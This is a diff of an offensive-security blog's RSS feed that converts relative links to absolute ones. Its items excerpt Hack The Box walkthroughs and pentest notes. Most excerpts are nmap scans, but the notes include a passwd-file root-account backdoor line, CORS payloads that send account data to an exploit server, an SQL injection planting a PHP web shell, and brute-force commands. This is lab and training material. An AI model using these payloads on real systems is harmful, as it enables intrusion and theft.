@@ -2,449 +2,449 @@
 <rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
   <channel>
     <title>meowmeowattack</title>
-    <link>/</link>
+    <link>https://meowmeowattack.github.io/</link>
     <description>Recent content on meowmeowattack</description>
     <generator>Hugo -- gohugo.io</generator>
     <language>en-us</language>
-    <lastBuildDate>Tue, 01 Nov 2022 14:49:58 +1300</lastBuildDate><atom:link href="/index.xml" rel="self" type="application/rss+xml" />
+    <lastBuildDate>Tue, 01 Nov 2022 14:49:58 +1300</lastBuildDate><atom:link href="https://meowmeowattack.github.io/index.xml" rel="self" type="application/rss+xml" />
     <item>
       <title>HTB - Flight [Hard]</title>
-      <link>/htb/flight/</link>
+      <link>https://meowmeowattack.github.io/htb/flight/</link>
       <pubDate>Mon, 07 Nov 2022 12:02:16 +1300</pubDate>
       
-      <guid>/htb/flight/</guid>
+      <guid>https://meowmeowattack.github.io/htb/flight/</guid>
       <description>TCP Scan &amp;gt; TARGET=10.129.69.58 &amp;amp;&amp;amp; nmap -p$(nmap -p- --min-rate=1000 -T4 $TARGET -Pn | grep ^[0-9] | cut -d &amp;#39;/&amp;#39; -f 1 | tr &amp;#39;\n&amp;#39; &amp;#39;,&amp;#39; | sed s/,$//) -sC -sV -Pn -vvv $TARGET -oN nmap_tcp_all.nmap PORT STATE SERVICE REASON VERSION 53/tcp open domain syn-ack ttl 127 Simple DNS Plus 80/tcp open http syn-ack ttl 127 Apache httpd 2.4.52 ((Win64) OpenSSL/1.1.1m PHP/8.1.1) | http-methods: | Supported Methods: OPTIONS HEAD GET POST TRACE |_ Potentially risky methods: TRACE |_http-title: g0 Aviation |_http-server-header: Apache/2.</description>
     </item>
     
     <item>
       <title>HTB - Meta Two [Easy]</title>
-      <link>/htb/metatwo/</link>
+      <link>https://meowmeowattack.github.io/htb/metatwo/</link>
       <pubDate>Sun, 30 Oct 2022 21:32:38 +1300</pubDate>
       
-      <guid>/htb/metatwo/</guid>
+      <guid>https://meowmeowattack.github.io/htb/metatwo/</guid>
       <description>TCP Scan &amp;gt; TARGET=10.129.65.154 &amp;amp;&amp;amp; nmap -p$(nmap -p- --min-rate=1000 -T4 $TARGET -Pn | grep ^[0-9] | cut -d &amp;#39;/&amp;#39; -f 1 | tr &amp;#39;\n&amp;#39; &amp;#39;,&amp;#39; | sed s/,$//) -sC -sV -Pn -vvv $TARGET -oN nmap_tcp_all.nmap PORT STATE SERVICE REASON VERSION 21/tcp open ftp? syn-ack ttl 63 22/tcp open ssh syn-ack ttl 63 OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0) 80/tcp open http syn-ack ttl 63 nginx 1.18.0 | http-methods: |_ Supported Methods: GET HEAD POST OPTIONS |_http-title: Did not follow redirect to http://metapress.</description>
     </item>
     
     <item>
       <title>HTB - Awkward [Medium]</title>
-      <link>/htb/awkward/</link>
+      <link>https://meowmeowattack.github.io/htb/awkward/</link>
       <pubDate>Sun, 23 Oct 2022 22:22:53 +1300</pubDate>
       
-      <guid>/htb/awkward/</guid>
+      <guid>https://meowmeowattack.github.io/htb/awkward/</guid>
       <description>TCP Scan &amp;gt; TARGET=10.129.61.151 &amp;amp;&amp;amp; nmap -p$(nmap -p- --min-rate=1000 -T4 $TARGET -Pn | grep ^[0-9] | cut -d &amp;#39;/&amp;#39; -f 1 | tr &amp;#39;\n&amp;#39; &amp;#39;,&amp;#39; | sed s/,$//) -sC -sV -Pn -vvv $TARGET -oN nmap_tcp_all.nmap PORT STATE SERVICE REASON VERSION 22/tcp open ssh syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3 (Ubuntu Linux; protocol 2.0) 80/tcp open http syn-ack ttl 63 nginx 1.18.0 (Ubuntu) |_http-title: Site doesn&amp;#39;t have a title (text/html). | http-methods: |_ Supported Methods: GET HEAD |_http-server-header: nginx/1.</description>
     </item>
     
     <item>
       <title>HTB - RainyDay [Hard]</title>
-      <link>/htb/rainyday/</link>
+      <link>https://meowmeowattack.github.io/htb/rainyday/</link>
       <pubDate>Sun, 16 Oct 2022 23:18:05 +1300</pubDate>
       
-      <guid>/htb/rainyday/</guid>
+      <guid>https://meowmeowattack.github.io/htb/rainyday/</guid>
       <description>Scanning &amp;gt; TARGET=10.129.59.24 &amp;amp;&amp;amp; nmap -p$(nmap -p- --min-rate=1000 -T4 $TARGET -Pn | grep ^[0-9] | cut -d &amp;#39;/&amp;#39; -f 1 | tr &amp;#39;\n&amp;#39; &amp;#39;,&amp;#39; | sed s/,$//) -sC -sV -Pn -vvv $TARGET -oN nmap_tcp_all.nmapPORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 8.9p1 Ubuntu 3 (Ubuntu Linux; protocol 2.0)80/tcp open http nginx 1.18.0 (Ubuntu)|_http-server-header: nginx/1.18.0 (Ubuntu)|_http-title: Did not follow redirect to http://rainycloud.htb Add rainycloud.htb to /etc/hosts Web Enum dirsearch &amp;gt; dirsearch -u http://rainycloud.</description>
     </item>
     
     <item>
       <title>HTB - Photobomb [Easy]</title>
-      <link>/htb/photobomb/</link>
+      <link>https://meowmeowattack.github.io/htb/photobomb/</link>
       <pubDate>Sun, 09 Oct 2022 23:18:05 +1300</pubDate>
       
-      <guid>/htb/photobomb/</guid>
+      <guid>https://meowmeowattack.github.io/htb/photobomb/</guid>
       <description>Scanning &amp;gt; TARGET=10.129.54.168 &amp;amp;&amp;amp; nmap -p$(nmap -p- --min-rate=1000 -T4 $TARGET -Pn | grep ^[0-9] | cut -d &amp;#39;/&amp;#39; -f 1 | tr &amp;#39;\n&amp;#39; &amp;#39;,&amp;#39; | sed s/,$//) -sC -sV -Pn -vvv $TARGET -oN nmap_tcp_all.nmapPORT STATE SERVICE REASON VERSION22/tcp open ssh syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)80/tcp open http syn-ack ttl 63 nginx 1.18.0 (Ubuntu)|_http-server-header: nginx/1.18.0 (Ubuntu)| http-methods: |_ Supported Methods: GET HEAD POST OPTIONS|_http-title: Did not follow redirect to http://photobomb.</description>
     </item>
     
     <item>
       <title>HTB - Ambassador [Medium]</title>
-      <link>/htb/ambassador/</link>
+      <link>https://meowmeowattack.github.io/htb/ambassador/</link>
       <pubDate>Sun, 02 Oct 2022 23:18:05 +1300</pubDate>
       
-      <guid>/htb/ambassador/</guid>
+      <guid>https://meowmeowattack.github.io/htb/ambassador/</guid>
       <description>Scanning &amp;gt; TARGET=10.129.51.137 &amp;amp;&amp;amp; nmap -p$(nmap -p- --min-rate=1000 -T4 $TARGET -Pn | grep ^[0-9] | cut -d &amp;#39;/&amp;#39; -f 1 | tr &amp;#39;\n&amp;#39; &amp;#39;,&amp;#39; | sed s/,$//) -sC -sV -Pn -vvv $TARGET -oN nmap_tcp_all.nmapPORT STATE SERVICE REASON VERSION22/tcp open ssh syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)80/tcp open http syn-ack ttl 63 Apache httpd 2.4.41 ((Ubuntu))|_http-generator: Hugo 0.94.2|_http-title: Ambassador Development Server| http-methods: |_ Supported Methods: OPTIONS HEAD GET POST|_http-server-header: Apache/2.</description>
     </item>
     
     <item>
       <title>HTB - Absolute [Insane]</title>
-      <link>/htb/absolute/</link>
+      <link>https://meowmeowattack.github.io/htb/absolute/</link>
       <pubDate>Sun, 25 Sep 2022 23:18:05 +1300</pubDate>
       
-      <guid>/htb/absolute/</guid>
+      <guid>https://meowmeowattack.github.io/htb/absolute/</guid>
       <description>Scanning &amp;gt; TARGET=10.129.49.253 &amp;amp;&amp;amp; nmap -p$(nmap -p- --min-rate=1000 -T4 $TARGET -Pn | grep ^[0-9] | cut -d &amp;#39;/&amp;#39; -f 1 | tr &amp;#39;\n&amp;#39; &amp;#39;,&amp;#39; | sed s/,$//) -sC -sV -Pn -vvv $TARGET -oN nmap_tcp_all.nmap PORT STATE SERVICE REASON VERSION 53/tcp open domain syn-ack ttl 127 Simple DNS Plus 80/tcp open http syn-ack ttl 127 Microsoft IIS httpd 10.0 |_http-server-header: Microsoft-IIS/10.0 |_http-title: Absolute | http-methods: | Supported Methods: OPTIONS TRACE GET HEAD POST |_ Potentially risky methods: TRACE 88/tcp open kerberos-sec syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2022-09-26 16:21:27Z) 135/tcp open msrpc syn-ack ttl 127 Microsoft Windows RPC 139/tcp open netbios-ssn syn-ack ttl 127 Microsoft Windows netbios-ssn 389/tcp open ldap syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: absolute.</description>
     </item>
     
     <item>
       <title>HTB - Shoppy [Easy]</title>
-      <link>/htb/shoppy/</link>
+      <link>https://meowmeowattack.github.io/htb/shoppy/</link>
       <pubDate>Sun, 18 Sep 2022 23:18:05 +1300</pubDate>
       
-      <guid>/htb/shoppy/</guid>
+      <guid>https://meowmeowattack.github.io/htb/shoppy/</guid>
       <description>Scanning &amp;gt; TARGET=10.129.180.36 &amp;amp;&amp;amp; nmap -p$(nmap -p- --min-rate=1000 -T4 $TARGET -Pn | grep ^[0-9] | cut -d &amp;#39;/&amp;#39; -f 1 | tr &amp;#39;\n&amp;#39; &amp;#39;,&amp;#39; | sed s/,$//) -sC -sV -Pn -vvv $TARGET -oN nmap_tcp_all.nmapPORT STATE SERVICE VERSION22/tcp open ssh syn-ack ttl 63 OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)80/tcp open http syn-ack ttl 63 nginx 1.23.1| http-methods: |_ Supported Methods: GET HEAD POST OPTIONS|_http-title: Shoppy Wait Page |_http-favicon: Unknown favicon MD5: D5F0A0ADD0BFBB2BC51607F78ECE2F57|_http-server-header: nginx/1.</description>
     </item>
     
     <item>
       <title>HTB - Sekhmet [Insane]</title>
-      <link>/htb/sekhmet/</link>
+      <link>https://meowmeowattack.github.io/htb/sekhmet/</link>
       <pubDate>Sun, 11 Sep 2022 23:18:05 +1300</pubDate>
       
-      <guid>/htb/sekhmet/</guid>
+      <guid>https://meowmeowattack.github.io/htb/sekhmet/</guid>
       <description>Scanning &amp;gt; TARGET=10.129.43.131 &amp;amp;&amp;amp; nmap -p$(nmap -p- --min-rate=1000 -T4 $TARGET -Pn | grep ^[0-9] | cut -d &amp;#39;/&amp;#39; -f 1 | tr &amp;#39;\n&amp;#39; &amp;#39;,&amp;#39; | sed s/,$//) -sC -sV -Pn -vvv $TARGET -oN nmap_tcp_all.nmapPORT STATE SERVICE REASON VERSION22/tcp open ssh syn-ack ttl 127 OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)80/tcp open http syn-ack ttl 127 nginx 1.18.0|_http-title: 403 Forbidden|_http-server-header: nginx/1.18.0 Web Enum Simple curl to check headers and basics &amp;gt; curl -i http://10.</description>
     </item>
     
     <item>
       <title>HTB - UpDown [Medium]</title>
-      <link>/htb/updown/</link>
+      <link>https://meowmeowattack.github.io/htb/updown/</link>
       <pubDate>Sun, 04 Sep 2022 23:18:05 +1300</pubDate>
       
-      <guid>/htb/updown/</guid>
+      <guid>https://meowmeowattack.github.io/htb/updown/</guid>
       <description>Summary User Flag Searching the place for a dev space, dumping the parts for an entry; Knowing the phrase for something special, showing the ways to somewhere great. Seeing the place and reading the code, spotting the vulns and the craft; Checking the web for a mode, knowing the form then you are not far. Into the realm and get to the home, reading the bean and the animal; Knowing the bean superbs the animal, breaking out the stomach of the foke.</description>
     </item>
     
     <item>
       <title>HTB - Vessel [Hard]</title>
-      <link>/htb/vessel/</link>
+      <link>https://meowmeowattack.github.io/htb/vessel/</link>
       <pubDate>Sun, 28 Aug 2022 23:18:05 +1300</pubDate>
       
-      <guid>/htb/vessel/</guid>
+      <guid>https://meowmeowattack.github.io/htb/vessel/</guid>
       <description>Scanning &amp;gt; TARGET=10.129.112.189 &amp;amp;&amp;amp; nmap -p$(nmap -p- --min-rate=1000 -T4 $TARGET -Pn | grep ^[0-9] | cut -d &amp;#39;/&amp;#39; -f 1 | tr &amp;#39;\n&amp;#39; &amp;#39;,&amp;#39; | sed s/,$//) -sC -sV -Pn -vvv $TARGET -oN nmap_tcp_all.nmapPORT STATE SERVICE REASON VERSION22/tcp open ssh syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)80/tcp open http syn-ack ttl 63 Apache httpd 2.4.41 ((Ubuntu))|_http-trane-info: Problem with XML parsing of /evox/about|_http-title: Vessel|_http-favicon: Unknown favicon MD5: 9A251AF46E55C650807793D0DB9C38B8| http-methods: |_ Supported Methods: GET HEAD POST OPTIONS|_http-server-header: Apache/2.</description>
     </item>
     
     <item>
       <title>HTB - Health [Medium]</title>
-      <link>/htb/health/</link>
+      <link>https://meowmeowattack.github.io/htb/health/</link>
       <pubDate>Sun, 21 Aug 2022 23:18:05 +1300</pubDate>
       
-      <guid>/htb/health/</guid>
+      <guid>https://meowmeowattack.github.io/htb/health/</guid>
       <description>Scanning &amp;gt; TARGET=10.129.134.255 &amp;amp;&amp;amp; nmap -p$(nmap -p- --min-rate=1000 -T4 $TARGET -Pn | grep ^[0-9] | cut -d &amp;#39;/&amp;#39; -f 1 | tr &amp;#39;\n&amp;#39; &amp;#39;,&amp;#39; | sed s/,$//) -sC -sV -Pn -vvv $TARGET -oN nmap_tcp_all.nmapPORT STATE SERVICE REASON VERSION22/tcp open ssh syn-ack ttl 63 OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)80/tcp open http syn-ack ttl 63 Apache httpd 2.4.29 ((Ubuntu))| http-methods: |_ Supported Methods: GET HEAD OPTIONS|_http-server-header: Apache/2.</description>
     </item>
     
     <item>
       <title>HTB - Outdated [Medium]</title>
-      <link>/htb/outdated/</link>
+      <link>https://meowmeowattack.github.io/htb/outdated/</link>
       <pubDate>Sun, 14 Aug 2022 23:18:05 +1300</pubDate>
       
-      <guid>/htb/outdated/</guid>
+      <guid>https://meowmeowattack.github.io/htb/outdated/</guid>
       <description>Scanning &amp;gt; TARGET=10.129.106.70 &amp;amp;&amp;amp; nmap -p$(nmap -p- --min-rate=1000 -T4 $TARGET -Pn | grep ^[0-9] | cut -d &amp;#39;/&amp;#39; -f 1 | tr &amp;#39;\n&amp;#39; &amp;#39;,&amp;#39; | sed s/,$//) -sC -sV -Pn -vvv $TARGET -oN nmap_tcp_all.nmapPORT STATE SERVICE REASON VERSION25/tcp open smtp syn-ack ttl 127 hMailServer smtpd| smtp-commands: mail.outdated.htb, SIZE 20480000, AUTH LOGIN, HELP|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY53/tcp open domain syn-ack ttl 127 Simple DNS Plus88/tcp open kerberos-sec syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2022-08-15 04:40:23Z)135/tcp open msrpc syn-ack ttl 127 Microsoft Windows RPC139/tcp open netbios-ssn syn-ack ttl 127 Microsoft Windows netbios-ssn389/tcp open ldap syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: outdated.</description>
     </item>
     
     <item>
       <title>HTB - Moderators [Hard]</title>
-      <link>/htb/moderators/</link>
+      <link>https://meowmeowattack.github.io/htb/moderators/</link>
       <pubDate>Sun, 07 Aug 2022 23:18:05 +1300</pubDate>
       
-      <guid>/htb/moderators/</guid>
+      <guid>https://meowmeowattack.github.io/htb/moderators/</guid>
       <description>Scanning &amp;gt; TARGET=10.129.129.9 &amp;amp;&amp;amp; nmap -p$(nmap -p- --min-rate=1000 -T4 $TARGET -Pn | grep ^[0-9] | cut -d &amp;#39;/&amp;#39; -f 1 | tr &amp;#39;\n&amp;#39; &amp;#39;,&amp;#39; | sed s/,$//) -sC -sV -Pn -vvv $TARGET -oN nmap_tcp_all.nmapPORT STATE SERVICE REASON VERSION22/tcp open ssh syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)80/tcp open http syn-ack ttl 63 Apache httpd 2.4.41 ((Ubuntu))|_http-title: Moderators| http-methods: |_ Supported Methods: GET HEAD POST OPTIONS|_http-server-header: Apache/2.</description>
     </item>
     
     <item>
       <title>HTB - Support [Easy]</title>
-      <link>/htb/support/</link>
+      <link>https://meowmeowattack.github.io/htb/support/</link>
       <pubDate>Sun, 31 Jul 2022 23:18:05 +1300</pubDate>
       
-      <guid>/htb/support/</guid>
+      <guid>https://meowmeowattack.github.io/htb/support/</guid>
       <description>Scanning TARGET=10.129.127.180 &amp;amp;&amp;amp; nmap -p$(nmap -p- --min-rate=1000 -T4 $TARGET -Pn | grep ^[0-9] | cut -d &amp;#39;/&amp;#39; -f 1 | tr &amp;#39;\n&amp;#39; &amp;#39;,&amp;#39; | sed s/,$//) -sC -sV -Pn -vvv $TARGET -oN nmap_tcp_all.nmapPORT STATE SERVICE REASON VERSION53/tcp open domain syn-ack ttl 127 Simple DNS Plus88/tcp open kerberos-sec syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2022-08-02 22:27:15Z)135/tcp open msrpc syn-ack ttl 127 Microsoft Windows RPC139/tcp open netbios-ssn syn-ack ttl 127 Microsoft Windows netbios-ssn389/tcp open ldap syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: support.</description>
     </item>
     
     <item>
       <title>HTB - Shared [Medium]</title>
-      <link>/htb/shared/</link>
+      <link>https://meowmeowattack.github.io/htb/shared/</link>
       <pubDate>Sun, 24 Jul 2022 23:18:05 +1300</pubDate>
       
-      <guid>/htb/shared/</guid>
+      <guid>https://meowmeowattack.github.io/htb/shared/</guid>
       <description>Scanning TARGET=10.10.11.172 &amp;amp;&amp;amp; nmap -p$(nmap -p- --min-rate=1000 -T4 $TARGET -Pn | grep ^[0-9] | cut -d &amp;#39;/&amp;#39; -f 1 | tr &amp;#39;\n&amp;#39; &amp;#39;,&amp;#39; | sed s/,$//) -sC -sV -Pn -vvv $TARGET -oN nmap_tcp_all.nmapPORT STATE SERVICE REASON VERSION22/tcp open tcpwrapped syn-ack ttl 63|_ssh-hostkey: ERROR: Script execution failed (use -d to debug)80/tcp open http syn-ack ttl 63 nginx 1.18.0| http-methods: |_ Supported Methods: GET HEAD POST OPTIONS|_http-title: Did not follow redirect to http://shared.</description>
     </item>
     
     <item>
       <title>HTB - Extension [Hard]</title>
-      <link>/htb/extension/</link>
+      <link>https://meowmeowattack.github.io/htb/extension/</link>
       <pubDate>Sun, 17 Jul 2022 23:18:05 +1300</pubDate>
       
-      <guid>/htb/extension/</guid>
+      <guid>https://meowmeowattack.github.io/htb/extension/</guid>
       <description>Scanning &amp;gt; TARGET=10.10.11.171 &amp;amp;&amp;amp; nmap -p$(nmap -p- --min-rate=1000 -T4 $TARGET -Pn | grep ^[0-9] | cut -d &amp;#39;/&amp;#39; -f 1 | tr &amp;#39;\n&amp;#39; &amp;#39;,&amp;#39; | sed s/,$//) -sC -sV -Pn -vvv $TARGET -oN nmap_tcp_all.nmapPORT STATE SERVICE REASON VERSION22/tcp open ssh syn-ack ttl 63 OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)80/tcp open http syn-ack ttl 63 nginx 1.14.0 (Ubuntu)|_http-favicon: Unknown favicon MD5: D41D8CD98F00B204E9800998ECF8427E| http-methods: |_ Supported Methods: OPTIONS HEAD GET POST|_http-server-header: nginx/1.</description>
     </item>
     
     <item>
       <title>Notes - Information Gathering</title>
-      <link>/notes/0-info-gathering/</link>
+      <link>https://meowmeowattack.github.io/notes/0-info-gathering/</link>
       <pubDate>Wed, 13 Jul 2022 23:18:05 +1300</pubDate>
       
-      <guid>/notes/0-info-gathering/</guid>
+      <guid>https://meowmeowattack.github.io/notes/0-info-gathering/</guid>
       <description>Port scanning using nmap Use -vvv for nmap scan to increase verbosity # TCP Scan &amp;gt; TARGET=&amp;lt;TARGET&amp;gt; &amp;amp;&amp;amp; nmap -p$(nmap -p- --min-rate=1000 -T4 $TARGET -Pn | grep ^[0-9] | cut -d &amp;#39;/&amp;#39; -f 1 | tr &amp;#39;\n&amp;#39; &amp;#39;,&amp;#39; | sed s/,$//) -sC -sV -Pn -vvv $TARGET -oN nmap_tcp_all.nmap # Vulnerability Scan &amp;gt; nmap -n -sV --script vuln &amp;lt;TARGET&amp;gt; -Pn -vvv # UDP scan &amp;gt; nmap -p- --min-rate=1000 -T4 &amp;lt;TARGET&amp;gt; -Pn -sU -vvv # Output in all formats &amp;gt; nmap -p- -sC -sV -oA tcp_all_ports &amp;lt;TARGET&amp;gt; Specific purpose scanning FTP bruteforce # nmap &amp;gt; nmap --script ftp-brute -p 21 &amp;lt;TARGET&amp;gt; -Pn # hydra &amp;gt; hydra -C /usr/share/wordlists/SecLists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.</description>
     </item>
     
     <item>
       <title>Notes - PE Linux</title>
-      <link>/notes/1a-pe-linux/</link>
+      <link>https://meowmeowattack.github.io/notes/1a-pe-linux/</link>
       <pubDate>Tue, 12 Jul 2022 23:18:05 +1300</pubDate>
       
-      <guid>/notes/1a-pe-linux/</guid>
+      <guid>https://meowmeowattack.github.io/notes/1a-pe-linux/</guid>
       <description>PE Scripts linpeas.sh: https://github.com/carlospolop/PEASS-ng GTFOBins: https://gtfobins.github.io/ Other useful scripts Linux PE References: https://guif.re/linuxeop Docker PE: https://github.com/stealthcopter/deepce linenum.sh: https://github.com/rebootuser/LinEnum linuxprivchecker.py: https://github.com/sleventyeleven/linuxprivchecker linux exploit suggester: https://github.com/mzet-/linux-exploit-suggester https://github.com/jondonas/linux-exploit-suggester-2 linux-smart-enumeration https://github.com/diego-treitos/linux-smart-enumeration Capabilities &amp;gt; getcap -r / 2&amp;gt;/dev/null Create account by writing to /etc/passwd # `hacker:pass123` &amp;gt; echo &amp;#39;hacker:$1$hacker$zVnrpoW2JQO5YUrLmAs.o1:0:0:root:/root:/bin/bash&amp;#39; &amp;gt;&amp;gt; /etc/passwd cron &amp;amp; background processes cron jobs &amp;gt; cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2&amp;gt;/dev/null | grep -v &amp;#34;^#&amp;#34; &amp;gt; ls -al /etc/cron* /etc/at* &amp;gt; crontab -l Process monitoring, look for processes run as uid=0 and that you can write to: https://book.</description>
     </item>
     
     <item>
       <title>Notes - PE Windows</title>
-      <link>/notes/1b-pe-win/</link>
+      <link>https://meowmeowattack.github.io/notes/1b-pe-win/</link>
       <pubDate>Mon, 11 Jul 2022 23:18:05 +1300</pubDate>
       
-      <guid>/notes/1b-pe-win/</guid>
+      <guid>https://meowmeowattack.github.io/notes/1b-pe-win/</guid>
       <description>PE Scripts winPEAS: https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS https://github.com/rasta-mouse/Sherlock &amp;gt; import-module .\Sherlock.ps1&amp;gt; Find-AllVulns&amp;gt; powershell -ExecutionPolicy Bypass -command &amp;#34;&amp;amp; { . .\Sherlock.ps1; Find-AllVulns }&amp;#34; Enum Find writable folders &amp;gt; dir /b /s /a:D Password search # reg pass search&amp;gt; reg query HKLM /f pass /t REG_SZ /s# search dir&amp;gt; dir *.dbx /s (Emails)# search passwords&amp;gt; findstr /si password *.xml *.ini *.txt (Find passwords) Char limit: dir /x shows the directory in old notation.</description>
     </item>
     
     <item>
       <title>HTB - RedPanda [Easy]</title>
-      <link>/htb/redpanda/</link>
+      <link>https://meowmeowattack.github.io/htb/redpanda/</link>
       <pubDate>Sun, 10 Jul 2022 23:18:05 +1300</pubDate>
       
-      <guid>/htb/redpanda/</guid>
+      <guid>https://meowmeowattack.github.io/htb/redpanda/</guid>
       <description>Scanning TARGET=10.10.11.170 &amp;amp;&amp;amp; nmap -p$(nmap -p- --min-rate=1000 -T4 $TARGET -Pn | grep ^[0-9] | cut -d &amp;#39;/&amp;#39; -f 1 | tr &amp;#39;\n&amp;#39; &amp;#39;,&amp;#39; | sed s/,$//) -sC -sV -Pn -vvv $TARGET -oN nmap_tcp_all.nmapPORT STATE SERVICE REASON VERSION22/tcp open ssh syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)8080/tcp open http-proxy syn-ack ttl 63| fingerprint-strings: | GetRequest: | HTTP/1.1 200 | Content-Type: text/html;charset=UTF-8| Content-Language: en-US| Date: Sun, 17 Jul 2022 21:29:22 GMT| Connection: close| &amp;lt;!</description>
     </item>
     
     <item>
       <title>Notes - Web</title>
-      <link>/notes/2a-web/</link>
+      <link>https://meowmeowattack.github.io/notes/2a-web/</link>
       <pubDate>Sun, 10 Jul 2022 23:18:05 +1300</pubDate>
       
-      <guid>/notes/2a-web/</guid>
+      <guid>https://meowmeowattack.github.io/notes/2a-web/</guid>
       <description>beef # change port to 3000 &amp;gt; vi /etc/beef-xss/config.yaml &amp;gt; journalctl -u beef-xss &amp;gt; systemctl stop beef-xss.service;beef-xss cors tools: corscanner, ucors origin reflection &amp;lt;script&amp;gt; var req = new XMLHttpRequest(); req.onload = reqListener; req.open(&amp;#39;get&amp;#39;,&amp;#39;$url/accountDetails&amp;#39;,true); req.withCredentials = true; req.send(); function reqListener() { location=&amp;#39;/log?key=&amp;#39;+this.responseText; }; &amp;lt;/script&amp;gt; null origin &amp;lt;iframe sandbox=&amp;#34;allow-scripts allow-top-navigation allow-forms&amp;#34; srcdoc=&amp;#34;&amp;lt;script&amp;gt; var req = new XMLHttpRequest(); req.onload = reqListener; req.open(&amp;#39;get&amp;#39;,&amp;#39;$url/accountDetails&amp;#39;,true); req.withCredentials = true; req.send(); function reqListener() { location=&amp;#39;$exploit-server-url/log?key=&amp;#39;+encodeURIComponent(this.responseText); }; &amp;lt;/script&amp;gt;&amp;#34;&amp;gt;&amp;lt;/iframe&amp;gt; insecure protocol &amp;lt;script&amp;gt; document.</description>
     </item>
     
     <item>
       <title>Notes - SQLi</title>
-      <link>/notes/2b-sqli/</link>
+      <link>https://meowmeowattack.github.io/notes/2b-sqli/</link>
       <pubDate>Sat, 09 Jul 2022 23:18:05 +1300</pubDate>
       
-      <guid>/notes/2b-sqli/</guid>
+      <guid>https://meowmeowattack.github.io/notes/2b-sqli/</guid>
       <description>sqli: common postgres RCE &amp;gt; &amp;#39; UNION SELECT (&amp;#34;&amp;lt;?php echo passthru($_GET[&amp;#39;cmd&amp;#39;]);&amp;#34;) INTO OUTFILE &amp;#39;C:/xampp/htdocs/cmd.php&amp;#39; -- -&amp;#39; common scenarios # logic injection&amp;gt; &amp;#39; or &amp;#39;1&amp;#39;=&amp;#39;1&amp;#39; --# create user and add as sys admin&amp;gt; create login hacker with password=&amp;#39;password&amp;#39;,default_database=[master]&amp;gt; EXEC master..sp_addsrvrolemember @loginame = N&amp;#39;hacker&amp;#39;, @rolename = N&amp;#39;sysadmin&amp;#39; Find database type # Microsoft, MySQL&amp;gt; SELECT @@version# Oracle&amp;gt; SELECT * FROM v$version# PostgreSQL&amp;gt; SELECT version() Resources https://github.</description>
     </item>
     
     <item>
       <title>Notes - Active Directory/Kerberos</title>
-      <link>/notes/3a-ad/</link>
+      <link>https://meowmeowattack.github.io/notes/3a-ad/</link>
       <pubDate>Fri, 08 Jul 2022 23:18:05 +1300</pubDate>
       
-      <guid>/notes/3a-ad/</guid>
+      <guid>https://meowmeowattack.github.io/notes/3a-ad/</guid>
       <description>cheatsheet Kerberos cheatsheet: https://gist.github.com/TarlogicSecurity/2f221924fef8c14a1d8e29f3cb5c5c4a Tools AD attacks cheatsheet: https://wadcoms.github.io/ Ghostpack: https://github.com/r3motecontrol/Ghostpack-CompiledBinaries PowerSharkPack: https://github.com/S3cur3Th1sSh1t/PowerSharpPack # Each script is stored in gzip + base64 format &amp;gt; base64 -d &amp;lt;b64-strings&amp;gt; &amp;gt; gzip -d file.gz bloodhound # setup &amp;gt; apt install bloodhound neo4j &amp;gt; python3 -m pip install bloodhound # run, default pass `neo4j:neo4j` &amp;gt; neo4j console &amp;gt; bloodhound --no-sandbox # clear db in neo4j &amp;gt; match (a) -[r] -&amp;gt; () delete a, r &amp;gt; match (a) delete a # bloodhound domain enum &amp;gt; bloodhound-python -d {domain} -u &amp;lt;user&amp;gt; -p &amp;lt;pass&amp;gt; -dc &amp;lt;dc-ip&amp;gt; -c all -ns &amp;lt;target-ns&amp;gt; &amp;gt; SharpHound.</description>
     </item>
     
     <item>
       <title>Notes - Shell</title>
-      <link>/notes/4-shell/</link>
+      <link>https://meowmeowattack.github.io/notes/4-shell/</link>
       <pubDate>Thu, 07 Jul 2022 23:18:05 +1300</pubDate>
       
-      <guid>/notes/4-shell/</guid>
+      <guid>https://meowmeowattack.github.io/notes/4-shell/</guid>
